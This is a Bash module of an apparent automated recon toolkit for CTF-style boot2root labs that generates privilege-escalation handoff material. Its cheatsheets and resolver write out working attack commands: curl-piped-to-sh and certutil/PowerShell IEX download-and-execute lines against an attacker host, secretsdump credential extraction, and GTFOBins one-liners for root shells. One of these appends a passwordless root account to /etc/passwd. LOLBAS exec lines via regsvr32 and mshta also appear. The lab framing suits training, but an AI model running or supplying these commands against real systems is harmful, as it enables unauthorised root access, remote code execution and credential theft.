#!/bin/bash
# ============================================================================
# AUTO RECON - Phase 9: Privilege Escalation & Post-Exploitation Handoff
# ----------------------------------------------------------------------------
# Boot2root targets need a path from foothold to root/SYSTEM. This phase does
# NOT exploit anything itself — it produces ready-to-paste handoff material:
#   - CVE hints mapped from discovered service banners (known HTB/OSCP wins)
#   - linpeas/winpeas/pspy/les fetch+run command cheatsheets (no bundled bins)
#   - GTFOBins / LOLBAS quick reference for SUID/sudo/capabilities abuse
# Everything is optional and degrades gracefully on a minimal box.
# ============================================================================

privesc_dir() { echo "${1}/privesc"; }

ensure_privesc_layout() {
    mkdir -p "$(privesc_dir "$1")"
}

# Best-effort attacker IP for reverse fetch/serve commands (prefers VPN ifaces).
privesc_attacker_ip() {
    local ip=""
    local iface
    for iface in tun0 tun1 tap0 eth0 wlan0; do
        ip=$(ip -4 addr show "$iface" 2>/dev/null | grep -oP 'inet \K[0-9.]+' | head -1)
        [[ -n "$ip" ]] && { echo "$ip"; return 0; }
    done
    # Fallback: default-route source address.
    ip=$(ip -4 route get 1.1.1.1 2>/dev/null | grep -oP 'src \K[0-9.]+' | head -1)
    echo "${ip:-<ATTACKER_IP>}"
}

# Guess the likely OS family from open ports / service banners.
# Echoes: "windows", "linux", or "unknown".
privesc_guess_os() {
    local nmap_file="$1"
    [[ -f "$nmap_file" ]] || { echo "unknown"; return; }
    local lc
    lc=$(tr '[:upper:]' '[:lower:]' < "$nmap_file")
    # Strong Linux signals (Samba/netbios alone are NOT Windows — Linux runs Samba).
    if echo "$lc" | grep -qE 'openssh|ubuntu|debian|\(unix\)|linux|raspbian|centos|fedora'; then
        echo "linux"; return
    fi
    # Strong Windows signals: RDP, WinRM, Kerberos/AD, IIS, explicit Windows banner.
    if echo "$lc" | grep -qE 'ms-wbt-server|microsoft windows|microsoft iis|kerberos-sec|winrm|wsman|active directory|\.net'; then
        echo "windows"; return
    fi
    # Ambiguous SMB-only: lean Windows only if no Samba string present.
    if echo "$lc" | grep -qE 'microsoft-ds|netbios-ssn' && ! echo "$lc" | grep -qi 'samba'; then
        echo "windows"; return
    fi
    echo "unknown"
}

# ── CVE hint table ─────────────────────────────────────────────────────────
# Maps banner regexes -> "CVE | one-line note". Curated for the classics that
# routinely show up on HTB / THM / OffSec / Proving Grounds boxes.
privesc_cve_hints() {
    local nmap_file="$1"
    [[ -f "$nmap_file" ]] || return 0
    local banners
    banners=$(grep -E '^[0-9]+/' "$nmap_file" 2>/dev/null | grep -i open)
    [[ -z "$banners" ]] && return 0

    # pattern<TAB>note  (matched case-insensitively against each open line)
    local -a rules=(
        'vsftpd 2.3.4|CVE-2011-2523 — vsftpd 2.3.4 smiley-face backdoor (metasploit: exploit/unix/ftp/vsftpd_234_backdoor)'
        'proftpd 1.3.5|CVE-2015-3306 — ProFTPD mod_copy SITE CPFR/CPTO arbitrary file copy/RCE'
        'samba.*3\.0\.2[0-5]|CVE-2007-2447 — Samba username map script command execution (usermap_script)'
        'samba.*4\.[5-9]|CVE-2017-7494 (SambaCry) — verify writable share + load module path'
        'unrealircd|CVE-2010-2075 — UnrealIRCd 3.2.8.1 backdoor'
        'apache httpd 2\.4\.49|CVE-2021-41773 — Apache path traversal / RCE'
        'apache httpd 2\.4\.50|CVE-2021-42013 — Apache path traversal / RCE'
        'openssh 7\.|CVE-2018-15473 — OpenSSH username enumeration (use with userlist)'
        'webmin|CVE-2019-15107 — Webmin <=1.920 password_change.cgi RCE'
        'drupal 7|CVE-2018-7600 (Drupalgeddon2) — Drupal RCE'
        'jenkins|Jenkins — check /script Groovy console + CVE-2024-23897 file read'
        'tomcat|Tomcat — try /manager/html default creds (tomcat:tomcat) -> WAR deploy RCE'
        'exim 4\.8|CVE-2019-10149 (Return of the WIZard) — Exim RCE'
        'pure-ftpd|CVE-2011-3171 / check anon + bounce'
        'microsoft-ds|MS17-010 (EternalBlue) — test with nmap smb-vuln-ms17-010 / nxc'
        'ms-wbt-server|CVE-2019-0708 (BlueKeep) RDP — verify before use, can crash host'
        'rpcbind|NFS/rpc exposed — enumerate showmount -e, no_root_squash priv-esc'
        'phpmyadmin|phpMyAdmin — default/weak creds -> SQL -> SELECT INTO OUTFILE webshell'
        'shellshock|CVE-2014-6271 (Shellshock) — test CGI endpoints'
    )

    local rule pat note
    while IFS= read -r line; do
        local lc
        lc=$(echo "$line" | tr '[:upper:]' '[:lower:]')
        for rule in "${rules[@]}"; do
            pat="${rule%%|*}"
            note="${rule#*|}"
            if echo "$lc" | grep -qiE "$pat"; then
                printf '  [%s] %s\n      ↳ %s\n' "$(echo "$line" | awk '{print $1}')" "$note" "$(echo "$line" | sed 's/^[[:space:]]*//')"
            fi
        done
    done <<< "$banners"
}

# ── Cheatsheet writers ─────────────────────────────────────────────────────
privesc_write_linux_sheet() {
    local out="$1" lhost="$2"
    cat > "$out" <<EOF
=== Linux Privilege Escalation Handoff ===
Attacker IP (auto-detected): ${lhost}

# 0) Serve tools from your box (run in a dir holding linpeas.sh, pspy64, etc.)
python3 -m http.server 8000

# 1) Enumerate fast
curl http://${lhost}:8000/linpeas.sh | sh           # or wget -qO- ... | sh
./linpeas.sh -a 2>&1 | tee linpeas.txt              # if already uploaded
./pspy64                                            # watch cron / processes (no root needed)
./lse.sh -l1                                        # linux-smart-enumeration

# 2) Manual quick wins
id; sudo -l                                         # sudo rights -> GTFOBins
find / -perm -4000 -type f 2>/dev/null              # SUID binaries -> GTFOBins
getcap -r / 2>/dev/null                             # capabilities (cap_setuid etc.)
cat /etc/crontab; ls -la /etc/cron.*                # writable cron jobs
grep -riE 'password|passwd|secret|api[_-]?key' /var/www /home /opt 2>/dev/null
ss -tlnp                                            # internal-only services -> port fwd

# 3) Kernel
uname -a; cat /etc/os-release
# -> searchsploit "linux kernel <version>"  /  check DirtyPipe (5.8-5.16) CVE-2022-0847,
#    DirtyCOW (<4.8.3) CVE-2016-5195, PwnKit/pkexec CVE-2021-4034, Sudo Baron Samedit CVE-2021-3156

# 4) Upgrade shell
python3 -c 'import pty;pty.spawn("/bin/bash")'; export TERM=xterm
# Ctrl-Z ; stty raw -echo; fg ; enter

# GTFOBins: https://gtfobins.github.io/   (filter by SUID / sudo / capabilities)
EOF
}

privesc_write_windows_sheet() {
    local out="$1" lhost="$2"
    cat > "$out" <<EOF
=== Windows Privilege Escalation Handoff ===
Attacker IP (auto-detected): ${lhost}

# 0) Serve tools (winPEASx64.exe, PrivescCheck.ps1, SharpUp.exe, accesschk.exe)
python3 -m http.server 8000

# 1) Download + run on target
certutil -urlcache -split -f http://${lhost}:8000/winPEASx64.exe wp.exe & wp.exe
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://${lhost}:8000/PrivescCheck.ps1'); Invoke-PrivescCheck"
powershell -c "iwr http://${lhost}:8000/SharpUp.exe -o su.exe"; su.exe audit

# 2) Manual quick wins
whoami /priv                                        # SeImpersonate -> Potato; SeBackup; SeManageVolume
whoami /groups
systeminfo                                          # -> wesng / windows-exploit-suggester
cmdkey /list ; dir C:\Users\*\.ssh\ 2>nul
reg query HKLM\SYSTEM\CurrentControlSet\Services\... # unquoted service paths / weak perms
.\accesschk.exe -uwcqv "Everyone" *                 # writable services

# 3) Token / AD
# SeImpersonatePrivilege  -> PrintSpoofer / GodPotato / JuicyPotatoNG
# AD: bloodhound-python -> find shortest path; check ASREProast / Kerberoast (already enumerated)

# 4) Pass shells / creds
impacket-secretsdump 'DOMAIN/user:pass@${lhost}'
evil-winrm -i <target> -u <user> -p <pass>

# LOLBAS: https://lolbas-project.github.io/   (download/exec/bypass living-off-the-land)
EOF
}

privesc_write_gtfo_sheet() {
    local out="$1"
    cat > "$out" <<'EOF'
=== GTFOBins / LOLBAS Quick Reference ===

GTFOBins (Linux) — https://gtfobins.github.io
  After `sudo -l` or finding SUID, look the binary up and pick the
  "sudo" / "SUID" / "capabilities" section. Common root shells:
    sudo:  vim, less, awk, find, nano, env, python, perl, tar, man, nmap(--interactive on old)
    SUID:  bash -p, cp (overwrite /etc/passwd), find -exec, dd, nmap, vim.basic
    cap_setuid:  python3, perl, node  (getcap shows the +ep flag)
  Examples:
    sudo find . -exec /bin/sh \; -quit
    sudo awk 'BEGIN {system("/bin/sh")}'
    sudo vim -c ':!/bin/sh'
    ./suid_python -c 'import os; os.setuid(0); os.system("/bin/bash")'

LOLBAS (Windows) — https://lolbas-project.github.io
  Living-off-the-land binaries for download / exec / bypass:
    certutil -urlcache -split -f <url> out.exe     (download)
    bitsadmin /transfer j http://host/f.exe C:\f.exe
    regsvr32 /s /u /i:http://host/f.sct scrobj.dll (exec)
    mshta http://host/f.hta
    rundll32, msbuild, installutil, wmic            (exec / bypass)
EOF
}

# ── Phase D: GTFOBins one-liner resolver ────────────────────────────────────
# Given a binary name, print the ready-to-run sudo/SUID escalation one-liner(s).
# Covers the binaries that actually show up in `sudo -l` / SUID sweeps on labs.
privesc_gtfo_resolve() {
    local bin; bin=$(basename "${1,,}")
    case "$bin" in
        find)     echo "sudo find . -exec /bin/sh \\; -quit    |SUID| find . -exec /bin/sh -p \\; -quit" ;;
        vim|vi)   echo "sudo vim -c ':!/bin/sh'                 |SUID| vim -c ':py3 import os; os.setuid(0); os.execl(\"/bin/sh\",\"sh\",\"-p\")'" ;;
        nano)     echo "sudo nano  →  ^R^X then: reset; sh 1>&0 2>&0" ;;
        less|more)echo "sudo less /etc/profile  →  type '!/bin/sh'" ;;
        awk|gawk) echo "sudo awk 'BEGIN {system(\"/bin/sh\")}'" ;;
        man)      echo "sudo man man  →  '!/bin/sh'" ;;
        env)      echo "sudo env /bin/sh" ;;
        python*|python3)  echo "sudo python3 -c 'import os; os.system(\"/bin/sh\")'   |cap_setuid| python3 -c 'import os;os.setuid(0);os.system(\"/bin/sh\")'" ;;
        perl)     echo "sudo perl -e 'exec \"/bin/sh\";'" ;;
        ruby)     echo "sudo ruby -e 'exec \"/bin/sh\"'" ;;
        node)     echo "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'" ;;
        tar)      echo "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh" ;;
        zip)      echo "sudo zip /tmp/x.zip /etc/hosts -T -TT 'sh #'" ;;
        nmap)     echo "sudo nmap --interactive  →  '!sh'  (old nmap only)  |else| echo 'os.execute(\"/bin/sh\")' > /tmp/x.nse; sudo nmap --script=/tmp/x.nse" ;;
        bash|sh)  echo "SUID: ./bash -p    |sudo| sudo bash" ;;
        cp)       echo "SUID cp: overwrite /etc/passwd with a root:\$(openssl passwd) line, or copy a SUID shell" ;;
        dd)       echo "SUID dd: echo 'root2::0:0::/root:/bin/bash' | dd of=/etc/passwd oflag=append conv=notrunc" ;;
        wget|curl)echo "sudo ${bin}: fetch a crafted /etc/passwd or shadow, then overwrite (needs writable target)" ;;
        systemctl)echo "sudo systemctl: write a malicious .service running /bin/sh, then start it" ;;
        docker)   echo "docker run -v /:/mnt --rm -it alpine chroot /mnt sh   (docker group = root)" ;;
        mysql)    echo "sudo mysql -e '\\! /bin/sh'" ;;
        gdb)      echo "sudo gdb -nx -ex '!sh' -ex quit   |cap| gdb -nx -ex 'python import os;os.setuid(0)' -ex '!sh'" ;;
        git)      echo "sudo git -p help  →  '!/bin/sh'   |else| sudo git branch --help then '!sh'" ;;
        ftp)      echo "sudo ftp  →  '!/bin/sh'" ;;
        *)        echo "" ;;
    esac
}

# Interactive: look up whatever the operator found in `sudo -l` / SUID sweep.
privesc_gtfo_interactive() {
    [[ "${INTERACTIVE:-true}" == "true" ]] || return 0
    declare -F _sh_ask >/dev/null || return 0
    local bin ans
    while true; do
        bin=$(_sh_ask "GTFOBins lookup — binary name (Enter to skip)" "")
        [[ -z "$bin" ]] && return 0
        ans=$(privesc_gtfo_resolve "$bin")
        if [[ -n "$ans" ]]; then
            echo -e "  ${GREEN}${bin}:${NC} ${ans}"
        else
            echo -e "  ${YELLOW}No canned one-liner for '${bin}'${NC} → https://gtfobins.github.io/gtfobins/${bin}/"
        fi
    done
}

# ── Phase D: auto-stage local peas/pspy binaries into the serve dir ─────────
# Finds linpeas/winpeas/pspy/lse on the attacker box (POST_TOOLS_DIRS + PATH),
# copies them where the file server can reach them, and prints exact fetch cmds.
privesc_stage_peass() {
    local serve_dir="$1" lhost="$2"
    mkdir -p "$serve_dir" 2>/dev/null
    local -a wanted=(linpeas.sh winPEASx64.exe winPEAS.bat pspy64 pspy32 lse.sh PrivescCheck.ps1 linux-exploit-suggester.sh)
    local staged=0 name found
    local -a search_dirs
    IFS=' ' read -ra search_dirs <<< "${POST_TOOLS_DIRS:-}"
    for name in "${wanted[@]}"; do
        found=""
        local d
        for d in "${search_dirs[@]}"; do
            [[ -f "${d}/${name}" ]] && { found="${d}/${name}"; break; }
        done
        [[ -z "$found" ]] && found=$(command -v "$name" 2>/dev/null)
        if [[ -n "$found" && -f "$found" ]]; then
            cp -f "$found" "${serve_dir}/${name}" 2>/dev/null && { staged=$((staged+1)); echo -e "  ${GREEN}✓${NC} staged ${name}"; }
        fi
    done
    if (( staged > 0 )); then
        log_success "${staged} tool(s) staged → ${serve_dir}"
        echo -e "  ${BOLD}Serve:${NC} python3 -m http.server 8000 --directory ${serve_dir}"
        echo -e "  ${BOLD}Fetch (Linux):${NC}   wget http://${lhost}:8000/linpeas.sh -O /tmp/lp.sh && sh /tmp/lp.sh"
        echo -e "  ${BOLD}Fetch (Windows):${NC} certutil -urlcache -split -f http://${lhost}:8000/winPEASx64.exe wp.exe & wp.exe"
    else
        log_info "No local peas/pspy binaries found in POST_TOOLS_DIRS or PATH — sheets still list fetch URLs."
        echo -e "  ${DIM}Get them: https://github.com/peass-ng/PEASS-ng/releases  ·  https://github.com/DominicBreuker/pspy${NC}"
    fi
    return 0
}

run_privesc() {
    local ip="$1"
    local result_dir="$2"

    section_header "PHASE 9: PRIVILEGE ESCALATION HANDOFF"
    ensure_privesc_layout "$result_dir"
    local pdir
    pdir=$(privesc_dir "$result_dir")
    local nmap_file="${result_dir}/scans/nmap_targeted.nmap"
    local lhost
    lhost=$(privesc_attacker_ip)
    local os_guess
    os_guess=$(privesc_guess_os "$nmap_file")

    log_info "Detected OS family: ${BOLD}${os_guess}${NC}  |  Attacker IP: ${BOLD}${lhost}${NC}"

    # ── 1. CVE hints from banners ──
    sub_header "Known-CVE Hints (from service banners)"
    local cve_file="${pdir}/cve_hints.txt"
    {
        echo "=== Privilege-Escalation / Exploit CVE Hints for ${ip} ==="
        echo ""
        privesc_cve_hints "$nmap_file"
    } > "$cve_file"
    local hint_count
    hint_count=$(grep -cE '^[[:space:]]*\[' "$cve_file" 2>/dev/null)
    hint_count=${hint_count:-0}
    if (( hint_count > 0 )); then
        grep -E '^[[:space:]]*\[' "$cve_file" | while IFS= read -r l; do
            echo -e "  ${RED}${l#  }${NC}"
        done
        log_success "${hint_count} CVE hint(s) → ${cve_file}"
    else
        log_info "No banner matched the curated CVE table (check searchsploit results in vulns/)."
    fi

    # ── 2. OS-specific cheatsheets ──
    sub_header "Priv-Esc Cheatsheets"
    privesc_write_linux_sheet "${pdir}/linux_privesc.txt" "$lhost"
    privesc_write_windows_sheet "${pdir}/windows_privesc.txt" "$lhost"
    privesc_write_gtfo_sheet "${pdir}/gtfobins_lolbas.txt"
    log_success "Linux sheet   → ${pdir}/linux_privesc.txt"
    log_success "Windows sheet → ${pdir}/windows_privesc.txt"
    log_success "GTFO/LOLBAS   → ${pdir}/gtfobins_lolbas.txt"

    case "$os_guess" in
        linux)   log_info "Primary path looks ${BOLD}Linux${NC} — start with linux_privesc.txt" ;;
        windows) log_info "Primary path looks ${BOLD}Windows${NC} — start with windows_privesc.txt" ;;
        *)       log_info "OS undetermined — both cheatsheets generated." ;;
    esac

    # ── 2b. Auto-stage peas/pspy into the shell-handler serve dir ──
    sub_header "Stage Post-Exploitation Tools"
    local serve_dir="${result_dir}/shells/serve"
    privesc_stage_peass "$serve_dir" "$lhost"

    # ── 2c. Interactive GTFOBins resolver ──
    privesc_gtfo_interactive

    # ── 3. Summary ──
    {
        echo "=== Privilege Escalation Handoff Summary ==="
        echo "Target:       ${ip}"
        echo "OS family:    ${os_guess}"
        echo "Attacker IP:  ${lhost}"
        echo "CVE hints:    ${hint_count}"
        echo ""
        echo "Artifacts:"
        echo "  cve_hints.txt        - exploit leads mapped from banners"
        echo "  linux_privesc.txt    - linpeas/pspy/lse + manual checks"
        echo "  windows_privesc.txt  - winpeas/PrivescCheck/SharpUp + manual checks"
        echo "  gtfobins_lolbas.txt  - SUID/sudo/cap + LOLBAS reference"
        echo ""
        echo "Tip: host your peas with 'python3 -m http.server 8000' from your tool dir."
    } > "${pdir}/summary.txt"

    log_success "Priv-esc handoff ready → ${pdir}/summary.txt"
    return 0
}
